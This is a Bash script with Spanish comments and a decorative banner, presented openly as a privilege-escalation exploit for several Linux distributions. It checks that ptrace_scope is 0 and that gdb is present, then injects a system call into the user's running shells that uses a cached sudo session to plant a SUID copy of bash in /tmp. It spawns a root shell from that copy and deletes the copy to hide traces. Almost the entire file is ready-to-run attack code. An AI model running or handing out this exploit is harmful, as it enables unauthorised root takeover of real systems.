#!/bin/bash

# Exploit Kali-Parrot-Cent0s-RedHat
# Escalamiento de privilegios

#Colours

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"





#-------------------------------------------------------------------------------------------------------------------------------------------------------

function startAttack(){ #Iniciamos el exploit

tput civis && pgrep "$(cat /etc/shells | grep -v "shells" | tr '/' ' ' | awk 'NF{print $Nf}' | sort -u | xargs | tr ' ' '|')" -u "$(id -u)" | while read shell_pid; 
do #Nos dara el pid de de las shells que esten corriendo en nuestro id de usuario y los metera a la variable shell_pid

			if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null)] ; then #si existe la tarea en proc o la ruta es valida
					echo -e "\n${yellowColour}[*] PID -->${endColour}${blueColour} $shell_pid${endColour} " #Mostrara el PID
					echo -e "${yellowColour}[*] Path -->${endColour}${blueColour} $(pwdx $shell_pid 2>/dev/null )${endColour}" #Mostrara la ruta absoluta
					echo -e  "${yellowColour}[*] Type --> ${endColour}${blueColour} $(cat /proc/$shell_pid/comm 2>/dev/null)${endColour}" #el nombre del servcio

			fi; echo 'call system("echo | sudo -s cp /bin/bash /tmp > /dev/null 2>&1 | sudo -S chmod +s /tmp/bash > /dev/null 2>&1")' | gdb -q -n -p "$shell_pid" > /dev/null 2>&1
						#Hacemos una llamada al sistema por gdb el cual copiaremos una bash a la carpeta temporal y darle permisos de SUID especificando el pid que queremos injectar

		done

		if [ -f /tmp/bash ]; then #Validamos que si copio la bash en tmp 
			/tmp/bash -p -c 'echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Limpiando .... ${endColour}"
							rm /tmp/bash
							echo -e "\t${greenColour}[*]${endColour}"
							echo -ne "${yellowColour}[*]${endColour}${grayColour} Obteniendo shell como root ....${endColour}"
							echo -e "\t${greenColour}[V]${endColour}"
							tput cnorm && bash -p'
		#Aqui se mandan instrucciones a traves de la bash para no dejar rastros entre comillas dondonos despues una session como root 
		else # si no se copio la bash  arrojar el siguiente mensaje 
			 	echo -e "\n${redColour}[*] No ha sido posible copiar el SUID /tmp/bash ${endColour}"

		fi 

}
#----------------------------------------------------------------------------------------------------------------------------------------------------------------


#------------------------------------------------------------------------------------------------------------------------------------------------------------------
function banner (){

echo -e "${turquoiseColour} ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ ██▓ ███▄    █   ▄████     ▄▄▄▄    ██▓     ▒█████    ▄████ ${endColour}"
echo -e "${turquoiseColour}▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓█████▄ ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒${endColour}"
echo -e "${turquoiseColour}▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░▄▄▄░${endColour}"
echo -e "${turquoiseColour}░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓   ▒██░█▀  ▒██░    ▒██   ██░░▓█  ██▓${endColour}"
echo -e "${turquoiseColour}░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒   ░▓█  ▀█▓░██████▒░ ████▓▒░░▒▓███▀▒${endColour}"
echo -e "${turquoiseColour}▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ${endColour}"
echo -e "${turquoiseColour}▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░ ${endColour}"
echo -e "${turquoiseColour} ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░   ░ ${endColour}"
echo -e "${turquoiseColour} ░  ░  ░      ░  ░░ ░      ░  ░    ░           ░       ░     ░          ░  ░    ░ ░        ░ ${endColour}"
echo -e "${turquoiseColour}                  ░                                               ░                          ${endColour}"
echo -e "${turquoiseColour}  Todos los creditos a ${endColour}${greenColour}(S4vitar) Marcelo Vazquez y a Victor Lasa (vowkin)${endColour}" 

}
#------------------------------------------------------------------------------------------------------------------------------------------------------------

banner

echo -ne "\n${yellowColour}[i]${endColour}${blueColour} Chekeando si 'ptrace_scope' esta en estado 0 ... ${endColour}"

if grep -q "0" < /proc/sys/kernel/yama/ptrace_scope; then #Validando si ptrace_scope esta en estado 0
	echo -e "\t${greenColour}[V]${endColour}"
	echo -ne "${yellowColour}[i]${endColour}${grayColour} Comprobando si 'GDB' se encuentra instalado${endColour}"

	if command -v gdb > /dev/null 2>&1; then #Validando si gdb esta instalado
		echo -e "\t${greenColour}[V]${endColour}"
		echo -e "\n${yellowColour}[i]${endColour}${grayColour} El sistema es Vulnerable! ${endColour}${greenColour}\t[V]${endColour}\n "
		echo "Comenzando con la escaladada de privilegios " #Validacion V si gdb esta instalado entonces lanzamos startAttack
		startAttack
	else 												#si no, entonces no es vulnerable :C
		echo -e "\t${redColour}[X]${endColour}"
		echo -e "${yellowColour} El sistema no es vulnerable :'c  ${endColour}${redColour}\t[X]$endColour"

	fi
else
	echo -e "${redColour}\t[X]${endColour}" #Si no esta en estado 1 ptrace-scope entonces no es vulnerble
	echo -e "${yellowColour}[*]$endColour${grayColour} El sistema no es vulnerable :c ${endColour}${redColour}[X]${endColour}"
fi;tput cnorm
